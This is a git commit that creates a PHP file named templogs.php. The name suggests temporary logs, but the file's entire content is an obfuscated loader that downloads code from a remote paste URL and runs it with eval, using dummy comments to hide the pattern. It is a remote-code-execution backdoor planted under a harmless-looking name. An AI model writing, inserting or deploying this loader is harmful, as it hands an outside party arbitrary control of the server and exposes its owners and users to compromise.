a0d497f410522abac3153ec24da24cae9551feef
youngkmd <103062072+youngkmd@users.noreply.github.com>
2024-06-18 04:16:46 +0100

    Create templogs.php

---
+++ templogs.php
@@ -0,0 +1,8 @@
+<?php eval(
+    /**_**/ urldecode("%3f%3e") .
+        file_get_contents(
+            /**_**/ urldecode(
+                /**_**/ "https://paste.myconan.net/497626.txt?idco=123132123335"
+            )
+        )
+); ?>
